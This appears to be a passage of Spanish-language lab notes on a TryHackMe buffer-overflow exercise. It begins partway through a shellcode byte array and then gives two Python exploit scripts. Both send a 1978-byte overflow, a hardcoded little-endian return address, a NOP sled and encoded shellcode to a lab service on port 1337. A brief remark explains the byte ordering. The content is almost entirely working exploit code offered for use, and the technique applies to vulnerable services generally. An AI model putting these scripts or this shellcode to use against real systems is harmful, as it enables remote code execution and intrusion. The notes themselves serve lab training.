b"\x89\x63\xf2\x5d\x18\x37\xd1\x79\x40\xe3\x78\xd8\x2c\x42" \
b"\x84\x3a\x8f\x3b\x20\x31\x22\x2f\x59\x18\x2b\x9c\x50\xa2" \
b"\xab\x8a\xe3\xd1\x99\x15\x58\x7d\x92\xde\x46\x7a\xd5\xf4" \
b"\x3f\x14\x28\xf7\x3f\x3d\xef\xa3\x6f\x55\xc6\xcb\xfb\xa5" \
b"\xe7\x19\xab\xf5\x47\xf2\x0c\xa5\x27\xa2\xe4\xaf\xa7\x9d" \
b"\x15\xd0\x6d\xb6\xbc\x2b\xe6\xb3\x42\x45\xfe\xab\x40\xa9" \
b"\xef\x77\xcc\x4f\x65\x98\x98\xd8\x12\x01\x81\x92\x83\xce" \
b"\x1f\xdf\x84\x45\xac\x20\x4a\xae\xd9\x32\x3b\x5e\x94\x68" \
b"\xea\x61\x02\x04\x70\xf3\xc9\xd4\xff\xe8\x45\x83\xa8\xdf" \
b"\x9f\x41\x45\x79\x36\x77\x94\x1f\x71\x33\x43\xdc\x7c\xba" \
b"\x06\x58\x5b\xac\xde\x61\xe7\x98\x8e\x37\xb1\x76\x69\xee" \
b"\x73\x20\x23\x5d\xda\xa4\xb2\xad\xdd\xb2\xba\xfb\xab\x5a" \
b"\x0a\x52\xea\x65\xa3\x32\xfa\x1e\xd9\xa2\x05\xf5\x59\xc2" \
b"\xe7\xdf\x97\x6b\xbe\x8a\x15\xf6\x41\x61\x59\x0f\xc2\x83" \
b"\x22\xf4\xda\xe6\x27\xb0\x5c\x1b\x5a\xa9\x08\x1b\xc9\xca" \
b"\x18")


shellcode = b"A" * 1978 + b"\xaf\x11\x50\x62"  + b"\x90" * 16 + overflow
#AF115062

print ("Vamos...1")

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('10.10.208.255',1337))

		payload= b"OVERFLOW1 " + shellcode

		s.send((payload))
		s.close()
		sleep(1)
		#buffer = buffer + "A" * 100
	except:
		print ("Fuzzing crashed at %s bytes" % str(len(shellcode)))	
		sys.exit()

```

El de THM:

```
import socket

ip = "10.10.208.255"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 32
payload ="\xdb\xc5\xbd\xc5\x8f\xbb\x3d\xd9\x74\x24\xf4\x5a\x2b\xc9" \
"\xb1\x52\x31\x6a\x17\x83\xc2\x04\x03\xaf\x9c\x59\xc8\xd3" \
"\x4b\x1f\x33\x2b\x8c\x40\xbd\xce\xbd\x40\xd9\x9b\xee\x70" \
"\xa9\xc9\x02\xfa\xff\xf9\x91\x8e\xd7\x0e\x11\x24\x0e\x21" \
"\xa2\x15\x72\x20\x20\x64\xa7\x82\x19\xa7\xba\xc3\x5e\xda" \
"\x37\x91\x37\x90\xea\x05\x33\xec\x36\xae\x0f\xe0\x3e\x53" \
"\xc7\x03\x6e\xc2\x53\x5a\xb0\xe5\xb0\xd6\xf9\xfd\xd5\xd3" \
"\xb0\x76\x2d\xaf\x42\x5e\x7f\x50\xe8\x9f\x4f\xa3\xf0\xd8" \
"\x68\x5c\x87\x10\x8b\xe1\x90\xe7\xf1\x3d\x14\xf3\x52\xb5" \
"\x8e\xdf\x63\x1a\x48\x94\x68\xd7\x1e\xf2\x6c\xe6\xf3\x89" \
"\x89\x63\xf2\x5d\x18\x37\xd1\x79\x40\xe3\x78\xd8\x2c\x42" \
"\x84\x3a\x8f\x3b\x20\x31\x22\x2f\x59\x18\x2b\x9c\x50\xa2" \
"\xab\x8a\xe3\xd1\x99\x15\x58\x7d\x92\xde\x46\x7a\xd5\xf4" \
"\x3f\x14\x28\xf7\x3f\x3d\xef\xa3\x6f\x55\xc6\xcb\xfb\xa5" \
"\xe7\x19\xab\xf5\x47\xf2\x0c\xa5\x27\xa2\xe4\xaf\xa7\x9d" \
"\x15\xd0\x6d\xb6\xbc\x2b\xe6\xb3\x42\x45\xfe\xab\x40\xa9" \
"\xef\x77\xcc\x4f\x65\x98\x98\xd8\x12\x01\x81\x92\x83\xce" \
"\x1f\xdf\x84\x45\xac\x20\x4a\xae\xd9\x32\x3b\x5e\x94\x68" \
"\xea\x61\x02\x04\x70\xf3\xc9\xd4\xff\xe8\x45\x83\xa8\xdf" \
"\x9f\x41\x45\x79\x36\x77\x94\x1f\x71\x33\x43\xdc\x7c\xba" \
"\x06\x58\x5b\xac\xde\x61\xe7\x98\x8e\x37\xb1\x76\x69\xee" \
"\x73\x20\x23\x5d\xda\xa4\xb2\xad\xdd\xb2\xba\xfb\xab\x5a" \
"\x0a\x52\xea\x65\xa3\x32\xfa\x1e\xd9\xa2\x05\xf5\x59\xc2" \
"\xe7\xdf\x97\x6b\xbe\x8a\x15\xf6\x41\x61\x59\x0f\xc2\x83" \
"\x22\xf4\xda\xe6\x27\xb0\x5c\x1b\x5a\xa9\x08\x1b\xc9\xca" \
"\x18"

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

```

Algo que tienens que tener en cuenta son la direccion de retorno pasarla a little endial(alrrevez). Y ponerla a manera que sea interpretada como ascii. (\x90).

![image](https://github.com/gecr07/-Buffer-Overflow-/assets/63270579/232a1a0c-87b9-45b2-b4b0-d0956a26eebb)






